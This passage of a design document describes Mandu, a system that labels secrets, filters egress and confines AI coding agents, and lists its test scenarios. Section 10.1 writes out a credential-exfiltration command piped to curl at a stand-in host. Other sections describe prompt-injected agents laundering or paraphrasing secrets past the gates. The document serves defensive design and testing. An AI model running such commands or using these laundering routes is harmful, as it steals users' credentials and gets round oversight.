  `suggestionRows`, the platform passed by `suggestion-routes.ts`): on macOS
  a history row's impact says it hides the committed versions on Linux, and
  that on macOS they stay readable. A workspace row is unchanged.

**The caches' seals (plan 14 §11.2, §11.3).** A macOS launch is confined
for the caches' purpose, and so holds no seal void and rotates no epoch,
only when the one Seatbelt profile seals the Mandu home (`seatbelt-setup.ts`
`profileSealsHome`): every home a launch hides absolute and read- and
write-denied with no carve-out reaching an enforcement store, every home
write-protected, the human plane walled off, and the Unix-socket list and
the six-program host-service deny on. The launch record then carries
`homeSealed: true` beside the `read-blocked` posture; the arbiter accepts
it only there. Everything else stays unconfined, as before. What that
vouches for is that everything running under the profile is denied every
direct read and write of the home. It does not stop code a system service
runs for the agent outside the profile ("What it does not cover" above:
a copied `launchctl`, a direct Mach or XPC client; guarantees.md §3
"Services reached over Mach or XPC"); that code can write the caches, and
the caches accept it on macOS as S3's same-uid process outside Mandu (plan
14 §11.2 residual (e), the §12 entry of 2026-09-30, implemented on the macOS branch, with fresh integrated-branch validation
still outstanding: the rotation at a session's end never bounded it,
and on macOS the caches serve only advisory
surfaces). The live test attacks the stores that claim rests on (read,
write, create, replace, link, rename; through a symlink, another letter
case, the `/System/Volumes/Data` firmlink, `..`, `/.vol/<dev>/<inode>`)
under the real profile, and a real launch's end is shown to rotate nothing.

## 8. Derived data — the laundering channel

`cat secret.env | base64`, `grep port config.secret`, a script that copies a
key into a new file: the output is "new" data and **must inherit the source's
confidentiality level**, or the guarantee is theater.

- **Conservative rule (all levels):** any output (stdout, written files) of
  a process that read a secret path inherits the highest confidentiality
  level read. The [`fs-provenance`](../integrity/fs-provenance.md) series
  (blame re-symbolization, exec lineage, proc-key attribution) is this
  machinery, built for integrity taint, with the level carried through the
  same lineage records. Under the twin, a process that is not a reader
  never holds the raw bytes, so there is nothing to taint; plan 10 enacts
  the rule at process level for the programs that do (named readers: the
  label follows stdout, `connect()`, written files and children,
  [`confidentiality-plan-10-flow-taint.md`](./confidentiality-plan-10-flow-taint.md)).
- **Quarantined-read results** (§3.3 rung 2) inherit the source label by
  construction: the re-symbolized return value is a derived datum.
- **In a high session the watermark subsumes in-session derivation** (the
  whole session is already at the level), but derived **files** still need
  on-disk labels so *future* sessions classify them correctly.
  Cross-session persistence is a labeling act, not a runtime taint
  (`arbiter/policy/derived-labels.ts`): the label is minted at the mediated
  write, keyed on the HumanView path, and it RAISES the catalog/user
  verdict, never lowers it: a machine may taint, never declassify (an
  `any-model` session writing `~/.ssh/id_ed25519` must not relabel a key).
  In a high session the exec gate stops every command and asks the human
  (§4, "The human half"); an approved command runs under the session's
  taint where the guard runs, so a `Bash` redirect writing a derived file
  is labeled at the level of what the session read
  (`labelWrittenPathTainted`), and without the guard it is a
  human-approved command whose card says its files are not marked.
  The writer session itself is not masked against its own write: once the
  file is registered, its text in that session's HUMAN prompt (the human
  dictated it) goes as typed, when the file still holds exactly what the
  session's model wrote and its level is within the watermark
  ([plan 15 §13.10](./confidentiality-plan-15-prompt-filter.md); the mask
  had turned the human's own sentence into a token and the model wrote the
  token into the file). The Write's own success notice reaches that
  session's model raw too (§7.1, "The write notice"). Every other session
  reads the file as a symbol.
- **Declassification is first-class.** Conservative tainting grows
  monotonically; without a low-friction "release this derived artifact"
  approval (with provenance shown: *what secret(s) went into it*), utility
  dies by over-taint, and under composition with integrity (§9) over-taint
  compounds. Two forms, both one act, both showing provenance: an
  **exact-path user label** on the artifact (a standing release that
  survives re-writes; it beats the taint in either direction), or **clear
  the record** in the dashboard's derived table (blunt; a future
  high-session write re-taints it). An ANCESTOR label deliberately does NOT
  release: a bulk default on a directory must not silently release every
  secret-derived file dropped into it.
- **Session labels: a file the AGENT itself writes program output into
  (2026-10-05).** OpenCode 2 streams a backgrounded shell's output to
  `$XDG_DATA_HOME/opencode/shell/<hash>/sh_<id>.out` and names the file to
  the model ([supported-agents.md](../agents/supported-agents.md) §2.3 item
  7). The agent wrote it, so no derived record sees it and no human label
  names it. The proxy registers the exact path, when it forwards the result
  that names it, in a third store (`arbiter/policy/session-path-labels.ts`,
  op `sessionPathLabel`): `no-model`, bound nowhere, composed over every
  other store by the one label lookup (raise-only, so the data plane may
  ask), in memory only, until the arbiter stops or the human plane drops
  them (`clearSessionPathLabels`; the launcher does not, since clearing
  would lower the protection of a file still on disk). It is not a
  `setPathLabel` (the human's persistent act) and not a derived row
  (persistent, a holder's write). Every consumer of the label lookup sees
  it: the proxy's path-derived classification of a `read` or of a shell
  command that names the file, callTaint's file levels, `decideSecretOpen`.
  The kernel guard's open index (`derivedLabelsSince`) does not list it: it
  would hand the agent a twin of its own file. Since the same day the
  agent's whole data directory is a catalog location (the next item), so a
  session label is the second layer, for a path no catalog rule knows.
- **An agent's own stores (2026-10-05).** Claude Code's `~/.claude`
  (transcripts, every tool output), Codex's `~/.codex` and OpenCode's
  `~/.local/share/opencode` (its session database and OpenCode 2's kept
  shell output files) hold program output the proxy masked, raw. All three
  have one posture: a tool's read asks (fs-outbound `SENSITIVE_PATHS`), the
  catalog labels them `no-model`, and discovery never twins them, in any
  launch (`AGENT_STORES`), so the agent reads and writes its own store raw.
  The LOGIN files among them (`~/.claude/.credentials.json`,
  `~/.claude.json`, `~/.codex/auth.json`, OpenCode's `auth.json`, and
  `~/.anthropic`, `~/.openai`) are not stores since 2026-10-09: only a launch
  that runs that agent (or whose AI helper runs its CLI; OpenClaw runs
  Claude Code's and Codex's) leaves one raw and does not register it; in
  every other launch it is registered and twinned like any catalog secret,
  so another agent's key is a placeholder to programs and known to the
  egress gate (`AGENT_LOGIN_FILES`, secret-discovery.md §1.10;
  `MANDU_OTHER_AGENT_LOGINS=raw` registers it but leaves it readable).
  Registration is global and durable, so a session that runs the agent
  hands its net-proxy the logins it keeps (`MANDU_NET_PROXY_SESSION_LOGINS`),
  and the §4 tripwire leaves their registered rows out of that session's
  scans only: the agent's own refresh and service calls are not refused
  there, and every other session still trips on them.
  OpenCode's under another `XDG_DATA_HOME` is matched by shape
  (secret-catalog.ts `OPENCODE_DATA_SHAPE_RE`). Goose joined them on
  2026-10-07: `~/.local/share/goose` (the session store
  `sessions/sessions.db`) and `~/.local/state/goose` (the request log
  `logs/llm_request.*.jsonl`, every request whole before the proxy
  symbolized it, the prompt history, the CLI logs), with the same posture;
  another XDG directory or a `GOOSE_PATH_ROOT` layout is matched by shape
  (`GOOSE_DATA_SHAPE_RE`; supported-agents.md §5.6.2).

## 9. Composition with integrity — the eight cells

The 2×4 label yields eight states. Four are unremarkable:
`trusted×public` and `untrusted×public` are the integrity-only system;
`trusted×no-model` and `trusted×any-model` are the plain confidentiality
cases of §3. The `local-model` pair composes by location: toward an
external model it is the `no-model` cell of the same integrity (the synergy
below), and toward a declared local model it is the `any-model` cell, with
the same rules, including the danger-cell rules at a local main model
(§3.5). The two corners that matter:

**`untrusted × no-model` — composition is synergy.** A downloaded
credential: the model holds only an opaque token, so an integrity failure
cannot become a confidentiality breach: an injected model cannot leak
content it never had; the worst it can do is route the symbol somewhere the
binding already permits. Symmetrically, a `no-model` symbol steered into a
command position still hits the usage policy's untrusted-influenced
escalation. Each lattice covers the other's failure mode: **at this level
the composed system is strictly safer than either lattice alone.** This is
why `no-model` is the default and the zero-config story.

**`untrusted × any-model` — the danger cell.** The model-read affordance is
what makes it dangerous: an in-context read of untrusted secret content, or
of any `any-model` secret in a session that has already ingested untrusted
data, is precisely "injected model with the secret in hand." The composed
rules:

> 1. Release of any secret symbol, or any egress from a high session,
>    requires **(a)** the sink to be granted by the label (binding /
>    quarantine / watermark discipline), **and (b)** if the flow was
>    untrusted-influenced, **human approval regardless of the label**.
> 2. The standing model clearance of `any-model` is **suspended for
>    in-context reads** when the datum's integrity is untrusted or the
>    session is untrusted-tainted. A session holds in-context secrets
>    **or** ingests untrusted data; combining is not routine, and the
>    combined state escalates every egress.
> 3. **Quarantined reads remain allowed in the danger cell.** The
>    quarantine confines both threats at once: an injected U-LLM holding
>    the secret has no egress except its re-symbolized, secret-labeled
>    return value, opaque to T-LLM (integrity) and gated at release
>    (confidentiality). The quarantine is the designated mechanism for
>    *processing* doubly-labeled data.

> **Rule 2, as implemented.** The two suspension conditions are questions
> in **different lattices**, and they get different answers:
>
> - **The DATUM is untrusted ⇒ REFUSED, with no approval path.** An
>   in-context read puts *raw content* in front of the privileged model. If
>   that content is integrity-untrusted, this **is** the thing the whole
>   system prevents, and the invariant admits no click-through. Nor is it an
>   approval a human can evaluate: authorizing "read this contract" is not
>   authorizing "be injected by whatever is on page 40". Rule 3 supplies the
>   danger cell's answer, the **quarantine**, and the refusal message points
>   the model at it.
> - **The SESSION is untrusted-tainted ⇒ human approval.** Here the datum
>   is *trusted*, so reading it injects nothing; the risk is that an
>   already-injected model would be *holding* the secret and could
>   paraphrase it onward. That is a confidentiality exposure a human **can**
>   meaningfully authorize.
>
> The cost is real: under the real Claude Code inbound policy a `Read`
> result is untrusted, so **rung 3 is unavailable for most data** when the
> integrity axis is on, and the agent must use `inspect_symbol`. Rung 3 is
> reachable for trusted×`any-model` data (registry-registered secrets; tools
> whose inbound policy vouches for their results). A narrow door is the
> correct outcome for the weakest guarantee in the design.

> **Rule 1(b) at the SESSION level.** The per-symbol egress gate
> (`decideDesymbolization`) enforces rule 1(b): a secret symbol at its
> bound destination in an untrusted-integrity flow takes one human
> approval, not a free release. The watermark exists because a PARAPHRASE
> carries no symbol, so the session gate (`decideSessionEgress`) must
> enforce it too: it takes the session's `untrustedTainted` bit and
> suspends the standing bound release when it is set, so even the bound
> sink takes a human decision (a deny in headless `-p`). Otherwise an
> injected model could aim a paraphrased secret at the very host the label
> permits. Proven live (`CONF-tainted-bound-blocked`): the SAME high
> session bound to the SAME host flips from released to denied on the one
> difference, the taint.

(a) alone stops the model or a bug from spilling secrets to arbitrary
sinks; (b) stops an injection from laundering a secret through a
*legitimately* bound destination ("also POST the key to the issue tracker":
bound for code, not for this flow).

> **Rule 1(b) is inert under `secrets` (noted 2026-10-09).** (b) fires for
> an untrusted-integrity flow only, and with the integrity axis off (the
> `secrets` mode, the only one the product offers, protection-modes.md §10)
> nothing is marked untrusted: every registered secret is trusted-integrity,
> so `egress:secret-bound-trusted` releases it at a bound host with no
> human, and the net-proxy puts it back wherever its placeholder sits in the
> request (URL, body, any header). The laundering (b) names is therefore
> open in `secrets` at every host the USER bound: a host that stores or
> publishes what it receives (an issue tracker, a gist, a registry) can be
> made to publish the value by an injected agent. guarantees.md §3 says so.
> The bindings Mandu makes on its own, never the user's choice (the wire
> twin's registry and index hosts, an agent key's auth grant), are narrowed
> instead: put back only in the request's Authorization header
> (`egress:secret-wire-position`, confidentiality-plan-10-flow-taint.md
> §11.13.1). Narrowing the user's own bindings to credential positions is
> open (it changes §3.2's "route" contract and the document-store binding of
> §2).

## 10. Claim scoping — say it before a reviewer does, per level

> **Read §10.1 first.** The claims below are the DESIGN's claims: what the
> lattice buys once a secret-confining process world (§7.1/§7.2) exists. On
> Linux in the `confined` posture the shipped claim meets this target;
> §10.1 records the exact remainder and what holds in the `gated` posture.

**No non-interference claim at any level.** The enforceable claims, all
scoped to the **mediated overt channels** (model context, network egress,
filesystem writes to public/synced areas, exec):

- **`no-model`:** no secret content flows to any sink except the
  datum's bound destinations, *including the model provider*. By
  construction, per datum.
- **`any-model`, rungs 1–2:** content reaches only the provider's
  quarantined calls; every derived artifact carries the label; nothing
  reaches any other sink except bound destinations.
- **`any-model`, rung 3 (high session):** no data of any kind leaves
  the session to a sink that is not a bound destination, without approval;
  verbatim content is additionally fingerprint-matched everywhere. The
  provider's own handling of what the label cleared it to read is **outside
  the technical claim**: it is the content of the labeling decision
  (contractual, not architectural).

Residual risks, documented: inference channels (exit codes, file sizes,
timing, error prose). The claims at rung 3 are conjointly satisfiable with
the integrity invariant but **not independent of it**: an integrity residual
in a high session is amplified into paraphrase-exfiltration attempts, which
is why §9 rule 2 exists and why rungs 1–2 are preferred. Error text that
quotes secret-file content is a confidentiality channel of the same kind:
the arbiter's value backstop at classify masks a registered value quoted
verbatim in any `tool_result`, error or not; a partial or transformed quote
is the residual.

### 10.1 What ships TODAY without the kernel tier — the Track-A claim

The kernel-tier valve (§7.1) is deferred. What ships instead is the
unprivileged confinement of §7.2/§7.2a: the arbiter's secret registry, the
twin bind-mounts in the agent's userns, and the whole-agent guard (a
seccomp user-notification interposer, `mandu-net-guard`) that serves every
registered secret by descriptor at `open()`. With `--confidentiality` on a
Linux host that can confine, `cat ~/.aws/credentials` inside the agent's
world yields a **symbol** and `cat <secret> | curl …` carries a **token**
(proven live by `launcher/test/secret-twins-live.test.sh`). The posture on
Linux (`launcher/src/confinement-posture.ts`):

| Host | Posture | Gap / bindGap |
| --- | --- | --- |
| guard + bwrap/userns | `confined` (both layers) | none |
| guard, no bind (no userns, no bwrap, or the bind would stop nested sandboxes) | `confined` (guard alone) | `bindGap` names why |
| bwrap/userns, no guard | `gated`, the bind still up as a partial layer | `no-guard`, or `guard-off` when turned off (`--no-net-guard`, `MANDU_NET_GUARD=0`, `net-guard = false`, `--no-kernel`) |
| neither | `gated` | `no-bwrap` / `apparmor-userns` / `userns-off` |

- **`confined` requires the guard; the bind alone is `gated`.** With the
  bind and no guard, a secret file the host replaces while the agent runs (a
  token refresh, an editor save) detaches the twin bind and the real new
  file is readable; only the guard's by-path lookup catches it
  (rootless-confinement-ubuntu-2404.md §13).
- **A stock Ubuntu 24.04 is `confined` with no sudo:** the npm bundle ships
  the guard, and the guard alone serves every registered secret (plan 10
  §11.7, §8 phase 6). `mandu setup` adds the bind mount as a second layer.
  `gated` remains only where the guard binary is missing too (another
  platform, a bundle packed without native bins).
- **A host that cannot confine runs `gated` by default, not refused.** This
  deliberately turns a fail-closed default into a degrade, so its scope is
  exact. It does **not** touch the model-context invariant; what it weakens
  is the *confidentiality claim on an unconfigured host*, under a visible,
  named posture: everything in "What does NOT hold" below is open there,
  and every launch says so in plain words ("Programs the agent runs can
  still read your credential files"). The gap is never open while the user
  believes it is closed. A **host** gap degrades unless
  `--require-confinement`; an **arbiter** failure during discovery or
  registration is an incident, not a host condition, and still **refuses**
  unless `--best-effort`; `--require-confinement` refuses in every case and
  wins over `--best-effort`. Held by an e2e
  (`launcher-gated-posture.test.ts` G3).
- **A bwrap that follows symlinks in mount destinations** (CVE-2026-87766;
  Ubuntu 24.04's `0.9.0-1ubuntu0.3` dropped the backported fix) is probed at
  `mandu doctor` and at every launch whose bind is in use, and only WARNS:
  the guard's by-path lookup covers what a swapped parent directory would
  expose. The warning names the installed version, and a pre-0.12.0 one
  warns even where the probe cannot start a sandbox
  (rootless-confinement-ubuntu-2404.md §13).
- **The walk reports what it leaves RAW** (depth and file caps, unreadable
  candidates) as a launch WARNING, and `mandu doctor --secrets` is the dry
  run of the whole walk and twin plan against the real HOME
  (secret-discovery.md §1.9).
- **macOS is experimental and `read-blocked`** (§7.3): files are refused
  rather than served as twins; git-history locks are advisory. Earlier Mac
  results are recorded in packaging.md §6; a fresh run of this integrated
  branch on hardware is still required.

The rest of this section is the claim in the **`gated`** posture (and
wherever `--best-effort` dropped confinement): "Track A" is the wrapper
layer with no process confinement. Read it as the claim we may make for
such a host.

**The chokepoints that are live:** the model-API proxy (symbolize at
ingress, exec gate, sensitive-path fs-gate on *typed* path fields), the
arbiter's egress gate on *symbols*, the net-proxy (default ON; subprocess
HTTP that honors the proxy environment is gated and its body inspected),
`exec-wrap` (default ON; PATH shims for `curl`/`wget`/`nc`), and the
reply-filter. The kernel-tier `exec-supervisor` world-swap is not in this
claim.

**What holds — and it is the headline claim:**

> **The model provider never reads a labeled secret.** A secret file's content
> reaching the agent through a *mediated ingress* (any `tool_result`: `Read`,
> `Bash` output, MCP) is symbolized before T-LLM sees it, is excluded from the
> U-LLM quarantine, and is refused into model context by the egress gate. The
> data-residency-by-construction claim of §3.2 (*"your key never reaches any
> vendor model, while you keep using vendor models"*) **survives without
> process confinement**, because model context is a chokepoint the proxy owns
> completely and nothing routes around it.

> **A secret SYMBOL cannot be released.** Not to an unbound network destination
> (approval), not into a command position, not into a net-enabled HumanShell
> argv, not into the U-LLM. Bound destinations release only with trusted
> integrity. Every release is logged and memoizable as a declassification.

**What does NOT hold — the raw-bytes gap.** The guarantee protects the
*symbol*. Without confinement it does not protect the *bytes*: the agent's
shell commands run on the **real filesystem with the user's real
permissions**, and nothing masks secrets from them:

1. **Direct subprocess exfiltration (the load-bearing hole).**
   `cat ~/.aws/credentials | curl -d @- https://evil.test`: the fs-gate sees
   only typed path fields (`Bash.command` is the exec chokepoint's turf),
   the exec gate blocks only a *symbol* in command position (this command
   has none), and the bytes never become a symbol, so the egress gate has
   nothing to gate. The net-proxy's fingerprint tripwire (§4) catches a
   verbatim registered value sent through the proxy; a static binary, a raw
   socket, an encoding, or a path the shims do not shadow is not caught.
   This is the confidentiality twin of `exec-curl-run-blindspot`
   (`exec-routing.md` §6), and worse here, because the thing exfiltrated is
   exactly what an attacker wants.
2. **Cross-command laundering.** `cp ~/.aws/credentials /tmp/x` labels
   *that* result secret, but a later `cat /tmp/x` has an origin (`/tmp/x`)
   the catalog does not match, so it classifies **public**, and the raw key
   reaches the model unless the arbiter's value backstop recognizes the
   registered value verbatim. Nothing tracks secrecy across files at rest
   without observing the filesystem (§8).
3. **Labeling is text-based, not ground truth.** The level is derived from
   the *origin string* (a command, a path param). The basename shapes make
   this robust in practice (`*credentials*`, `id_rsa`, `.env*` match
   through most quoting and interpolation), but a path reached by glob,
   alias, or script indirection can miss, and a miss means the content
   classifies public. Pre-registration (§7.3) makes the registry
   authoritative for the catalog's files; observing opens (the guard, or the
   kernel tier's `openat`) is what makes labeling sound in general.

**So the precise scope of the `gated` claim:** *no vendor model reads a
recognized secret, and no secret symbol escapes, but a shell command the
agent runs can still read a secret file directly and send it anywhere.* Say
it that way. The MVP story (*"API keys cannot leave, by construction"*) is
earned only in the `confined` posture.

**The gap is identical on macOS without the deny profile**, for a subtler
reason: the AgentShell Seatbelt profile deliberately allows all reads,
justified by the integrity-lattice E4 guarantee, which is sound for
integrity and false for confidentiality (§7.3).

## 11. Phasing

**The kill switch.** The whole axis sits behind **one arbiter-owned
switch** (`MANDU_CONFIDENTIALITY`; launcher `--[no-]confidentiality`), read
once at arbiter start. Decision is centralized in the arbiter, so one switch
covers every chokepoint; the interceptors carry no flag of their own (they
act on arbiter answers). OFF is **byte-identical to the integrity-only
system for fresh allocation keys**: no level derivation, no
`nomodel_`/`anymodel_` wire markers (the marker is a model-visible name
change, so fresh labeling-without-enforcement is not inert), no enforcement
branches, no handling-prompt secret sections, no new confidentiality
response fields. The schema columns persist either way; flipping the switch
never migrates data. Rows minted while ON retain their labels, bindings,
and wire markers when reused while OFF. Canonical replacement of a
scanner-incomplete persisted name likewise preserves those restrictions and
renders the corresponding marker; this repairs an existing allocation
identity, rather than deriving a new label from an OFF request
([mandu.md §9](../architecture/mandu.md)).
Stored restrictions are **not consulted for enforcement** while OFF: the
switch disables *enforcement*, a deliberate act the dashboard surfaces.
Re-enabling it makes the retained restrictions effective again.

**Default ON since 2026-09-21** ([protection-modes.md](../architecture/protection-modes.md)):
the built-in default is the named mode `secrets` (confidentiality ON,
integrity OFF), held in ONE place (`arbiter/policy/protection-mode.ts`) that
both flag modules read. The flip was gated on three things, all answered:
the §12 matrix is green on both axes; a host that cannot confine launches in
the named `gated` posture instead of refusing
([rootless-confinement-ubuntu-2404.md](rootless-confinement-ubuntu-2404.md));
and every test suite states its axes, enforced by `MANDU_AXES_STRICT`
(`arbiter/policy/axes-strict.ts`), so the move cannot silently turn an
invariant suite into a no-op.

**The two-axis switch set.** The integrity axis has the same shape: **one
arbiter-owned switch** (`MANDU_INTEGRITY`; launcher `--[no-]integrity`;
`arbiter/policy/integrity-flag.ts`), read once at arbiter start, threaded as
an explicit option; decision code never reads ambient env. Both flags
resolve the same way: the axis variable if it says anything (only an
explicit `0`/`false`/`off` turns an axis OFF; any other non-empty value
fails toward protection), else `MANDU_MODE`'s value for the axis, else the
default mode `secrets`, under which integrity is OFF. Integrity OFF
collapses trust classification at its single source (`classify()` returns
TRUSTED for every field), so no untrusted symbol is ever minted and every
downstream integrity gate goes quiet with **no per-gate edits**; the
handling prompt drops the trust-machinery sections while keeping the
axis-neutral symbol contract that secret symbols ride. The confidentiality
derivation is untouched: `int OFF × conf ON` is the **conf-only
deployment**, where a TRUSTED-but-secret datum still symbolizes and the
watermark and secret-egress gates still fire. `int OFF` also forces
`fs-sync` OFF in the launcher (the AgentView twin exists to route UNTRUSTED
content around the model). Pre-existing untrusted symbols keep their
fail-closed resolution/egress semantics: the switch stops *minting*, it
never relaxes. Both axes OFF yields an empty handling prompt. The `hello` op
reports both switches, so the live suite's posture guard can verify the
posture it runs at (§12). The paper-facing invariant ("untrusted data
reaches T-LLM only as an opaque symbol") is scoped to **integrity axis ON**.

**The flags reach only an arbiter the launch starts.** The axes are read
once at arbiter start, so `--no-integrity` / `--confidentiality` … hand
`MANDU_INTEGRITY` / `MANDU_CONFIDENTIALITY` to the daemon *this launch
spawns*. When a resident arbiter already owns the socket nothing is spawned,
and the flag would change nothing in the arbiter while its launcher-side
implications still applied (`--no-integrity` forces fs-sync off): a
half-posture nobody asked for. The launcher therefore runs an **axis
preflight** (`launcher/src/axis-preflight.ts`, after the tenant preflight
and before any service): an axis set EXPLICITLY must equal what the attached
arbiter reports (`hello`, else `policySnapshot.posture`); a mismatch refuses
with the fix spelled out (`MANDU_INTEGRITY=0 scripts/dev-arbiter.sh`, then
`MANDU_ARBITER_SOCK=<its sock>`); an unset axis is never checked; an arbiter
that cannot report its axes passes with a warning.

**Build state.** The axis was built as a plan series; the plan documents
are retired and their decisions live in the sections named here.

| Plan | Scope | Status |
|---|---|---|
| 1 | Label schema + lattice + default-secret catalog + the kill switch (§2, §6, §11) | built |
| 2 | Egress gate secret branches + U-LLM exclusion + exec-argv withholding (§3.2, §7) | built |
| 3 | Model-context ingress + stored integrity axis + handling prompt + launcher flag (§7) | built |
| 4 | The §7.1 kernel valve: per-exec mount masking, untrusted-lineage clause | **deferred** (unprivileged userns, not host root) |
| 4′ | Unprivileged secret confinement: registry + §7.2 twin (Linux) + §7.3 Seatbelt deny (macOS) | built (macOS read-blocked; integrated branch needs fresh hardware validation) |
| 5 | Observability (event-stream label, `/api/secrets` standing surface) + the §12 oracle | built |
| 6 | The labeling store + UI: the first `any-model` producer (§6) | built |
| 7 | The quarantined read (§3.3 rung 2) + server-side label inheritance | built |
| 8 | The session high-watermark + in-context reads (§3.3 rung 3, §4, §9 rule 2) | built |
| 9 | On-disk labels for files a high session writes + the release UX (§4, §8) | built |
| 10 | Flow-based confinement: structured twins, readers, process taint ([`confidentiality-plan-10-flow-taint.md`](./confidentiality-plan-10-flow-taint.md)) | built |
| 11 | `local-model` + declared model endpoints (§3.5, [`model-endpoints.md`](./model-endpoints.md)) | complete |
| 12 | Declared models on the organization's network: TLS, endpoint identity, `perimeter:`, the administrator's layer ([`model-endpoints.md`](./model-endpoints.md) Part 2) | built (several clearance tiers not built) |
| — | Fingerprint tripwire (§4) | built |
| — | Purview/MIP label ingestion (§6) | planned (plan 14 §14.1) |
| — | The per-level leakage benchmark (§12) | open |

The order was forced by one fact: **`any-model` had no producer.** The
catalog yields only `public`/`no-model` by design (§6), so the labeling UI
was not a presentation layer over the read machinery; it was what made the
level exist, and the quarantined read and the watermark are defined
entirely in terms of it. Rung 3 shipped last deliberately: it is the
weakest guarantee (confinement, not opacity) and only safe once labeling
and the egress machinery are proven. Confinement (4′) came before the
default flip because publishing the zero-config story while §10.1's
raw-bytes gap was open would ship a claim we could not back.

**Un-defer triggers for the kernel Plan 4** (build it when any fires): a
deployment needs confidentiality where neither the guard nor an
unprivileged userns can run; the text-derived labeling of §10.1 item 3 is
shown to miss in practice (a real evasion, not a hypothetical) and
ground-truth `openat` labeling becomes load-bearing; or per-exec granularity
is needed because a legitimate task must read a secret raw in one command
while another talks to the network (plan 10's readers now cover most of
this case).

**Evidence that rung 2 is the path in practice.** The headline story is
proven deterministically on the wire (the §12 oracle drives a real proxy +
real arbiter + the real `inspectSymbol` and asserts the T-LLM wire carries
neither the contract nor its summary,
`tests/stack/confidentiality-oracle.test.ts`), and live against a real
model (`CONF-quarantine-summary`, `claude-e2e.test.ts`):
**a real model reaches for `inspect_symbol` (rung 2), not
`declassify_symbol` (rung 3)**, the session stays LOW, and the predicted
over-taint failure does not fire on the read path.

## 12. Evaluation & tests

> **Status: the matrix is IMPLEMENTED.** Fold 1 is the untouched integrity
> suite. Folds 2–4 and the fail-closed case are
> `tests/stack/confidentiality-oracle.test.ts` (real arbiter + real proxy +
> canned upstream, the dual of `full-stack.test.ts`), with per-seam duals in
> each proxy's e2e and the arbiter's unit suites, and the live confinement
> proof in `launcher/test/secret-twins-live.test.sh`. The **leakage
> benchmark** below is still to build.
>
> Two traps to know before writing another oracle: (a) the handling prompt
> legitimately **prints example `$MDU:nomodel_*` tokens** to teach the model
> the shape, so a body-wide regex for a secret symbol matches the *prompt*,
> not the datum; always assert on the `tool_result` span; (b) under the
> real inbound policy a `Read` result is UNTRUSTED-by-integrity, so the
> integration fixture exercises the `untrusted × secret` **synergy** cell
> (§9), while the `trusted × secret` corner is proven at the proxy seam
> where the verdict can be forced.

- **The POSTURE matrix: "the chokepoint is wired to a posture nobody runs".**
  Beyond the on/off switch, every label-dependent guarantee runs under
  **both** fs postures (`tests/stack/confidentiality-oracle.test.ts`, the
  `POSTURES` loop): with fs-sync on, the agent executes the AgentView twin
  and its `tool_use` args name the AgentView path, while every path policy
  is keyed in HumanView (§6). An explicitly labeled `any-model` contract
  once classified `public` in exactly that posture, hidden because the
  catalog still matched on basenames. The loop asserts: an `any-model`
  label is honored; a `no-model` label is honored and the U-LLM still
  refused; a `public` label still **declassifies** (the direction that
  fails *safe* and is therefore invisible to a security-only oracle); and
  OFF stays inert under both. The same bug class had left the net gate and
  the exec gate dead in an unexercised posture. Any new path-keyed store,
  or any new client that runs a view map, joins this matrix.
- **The on/off matrix.** The integrity design must be provably untouched by
  the switch (§11), so the oracle is **four-fold**: (1) **OFF × integrity**:
  the existing suite, unchanged; (2) **OFF × inertness**: no markers
  minted, no confidentiality fields on the wire, no new approvals or
  refusals; (3) **ON × integrity**: enabling the axis regresses neither the
  integrity invariant nor utility; (4) **ON × confidentiality**: the
  per-level assertions below, including the §9 composition cells. Every
  enforcement behavior lands with an OFF-dual test.
- **e2e oracle twin.** *Security*: `no-model`: no un-symbolized secret
  content on any egress path (model wire incl. U-LLM, net egress,
  HumanShell-visible and untrusted-lineage mounts) except bound
  destinations; `any-model`: quarantined-read results come back symbolized
  and labeled; no egress from a high session to an unbound sink; **what a
  high session WRITES, the next session cannot read back as public**
  (session A declassifies an `any-model` datum and writes a paraphrase;
  session B, a fresh session key, reads that file and receives a
  `$MDU:anymodel_*` symbol, and its egress is still gated); fingerprint
  tripwires fire on planted verbatim leaks; the §9 suspension rule blocks
  in-context reads in untrusted-tainted sessions. *Utility*: a benign
  secret-routing task completes without approval fatigue; a rung-2
  summarization completes with the T-LLM wire never carrying the content; a
  rung-3 read-task completes under the watermark. Both fail-closed paths
  asserted, per [`CONTRIBUTING.md`](../../../CONTRIBUTING.md).
- **The live suite (the `CONF-*` scenario class).** The deterministic
  oracle proves the *wire*; it cannot answer the empirical half: does a REAL
  model, under the handling prompt, behave as the design assumes, and does
  the full real stack (`claude` CLI + MCP + proxy + arbiter, axis ON) wire
  the axis together end to end? The scenarios live in
  `claude-e2e.test.ts` (each boots a private in-process
  conf-ON arbiter; `MANDU_E2E_CONF_INT=0` runs them at int OFF, the
  conf-only fold) and ran as the `real-model` manifest entry
  `integration.claude-headless.conf` (`integration.claude-e2e.conf-smoke`
  until 2026-10-15; test-organization.md §6.5) until it retired on
  2026-10-18: the drill catalog's conf drills, live and replayed nightly on
  Claude Code, carry each scenario (test-reorganization.md §9.1). Each
  scenario is named `CONF-<slug>` (the stable number is the dashboard
  badge, append-only); the oracle is `tests/lib/conf-oracle.ts`, and
  the wire canary is asserted on the model-facing `tllm_call` trace.

  | Scenario (badge) | Claim |
  |---|---|
  | `CONF-catalog-strict` (E29) | The zero-config catalog makes a workspace `.env` `no-model` with no labeling; the mint does not watermark. |
  | `CONF-quarantine-summary` (E30) | An `any-model` contract is summarized via `inspect_symbol`; the session stays low; the U-LLM output carries the fact, the derived name carries the `anymodel_` marker and a `derivedFrom` parent. |
  | `CONF-danger-cell-declassify` (E31) | Declassify on an *untrusted* `any-model` Read is not granted without approval (§9 rule 2). |
  | `CONF-watermark-egress-deny` (E32) | A HIGH session's WebFetch to an unbound host is blocked: the paraphrase case the per-symbol gate is blind to. |
  | `CONF-cross-session-label` (E33) | A HIGH session's Write is labeled on disk so the next session reads it as secret, and session B's reply still delivers the answer. |
  | `CONF-public-label-override` (E34) | A `public` label on a catalog `.env` lets it flow (§6's override, the utility half). |
  | `CONF-strict-quarantine-refused` (E35) | A `no-model` symbol is refused by `inspect_symbol` and no `ullm_call` runs (§3.2 exclusion). |
  | `CONF-bound-host-release` (E36) | A HIGH session may still reach a host its read data was bound to (§3.2 carve-out). |
  | `CONF-high-session-exec-gated` (E37) | A HIGH session's exec is gated: no Bash command can be proven net-less, so the watermark blocks every one. |
  | `CONF-secret-not-exfiltrated` (E38) | A LOW session reads an `any-model` secret and is asked to send it to an unbound host: the raw value never enters context and the read does not over-taint. |
  | `CONF-declassify-grant-taints` (E39) | On a *trusted* read (int OFF), `declassify_symbol` is granted, the content enters context, and the watermark flips HIGH. |
  | `CONF-mixed-workspace` (E40) | One workspace holds all three levels; each classifies at its own level, both secret canaries stay off the wire, the public answer flows, the session stays LOW. |
